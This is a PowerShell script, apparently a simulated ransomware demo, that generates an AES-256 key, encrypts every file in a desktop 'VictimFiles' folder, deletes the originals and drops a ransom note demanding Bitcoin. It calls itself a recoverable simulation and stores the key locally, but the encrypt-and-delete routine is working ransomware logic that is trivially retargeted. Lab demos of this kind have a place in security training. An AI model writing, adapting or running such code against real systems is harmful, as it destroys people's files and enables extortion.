# =============================
# File: encrypt.ps1
# =============================

$TargetFolder = "$env:USERPROFILE\Desktop\VictimFiles"
$KeyFile = "$env:USERPROFILE\Desktop\aes_key.bin"
$IVFile = "$env:USERPROFILE\Desktop\aes_iv.bin"
$RansomNote = "$env:USERPROFILE\Desktop\READ_ME_NOW.txt"

# Ensure target exists
if (!(Test-Path $TargetFolder)) {
    Write-Host "[!] Target folder does not exist. Creating dummy files..."
    mkdir $TargetFolder
    "Sample Document" | Out-File "$TargetFolder\doc1.txt"
    "Passwords" | Out-File "$TargetFolder\pwlist.docx"
    "Confidential Image" | Out-File "$TargetFolder\image.jpg"
}

# Generate AES key and IV
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize = 256
$AES.GenerateKey()
$AES.GenerateIV()
[IO.File]::WriteAllBytes($KeyFile, $AES.Key)
[IO.File]::WriteAllBytes($IVFile, $AES.IV)

# Encrypt all files in target
Get-ChildItem -Path $TargetFolder -File | ForEach-Object {
    $originalData = [IO.File]::ReadAllBytes($_.FullName)
    $encryptor = $AES.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($originalData, 0, $originalData.Length)
    [IO.File]::WriteAllBytes("$($_.FullName).ENCRYPTED", $encrypted)
    Remove-Item $_.FullName -Force
    Write-Host "[+] Encrypted: $($_.Name)"
}

# Drop ransom note
@"
==================================================
!!! YOUR FILES ARE ENCRYPTED !!!
Send 1 BTC to the following wallet:
    -> bc1qfakewalletx999

Then contact: dark@onionmail.fake

This is a simulated ransomware attack.
All files are recoverable using decrypt.ps1.
==================================================
"@ | Out-File $RansomNote

Write-Host "`n[*] Ransom note dropped: $RansomNote"
Write-Host "[*] Encryption simulation complete."
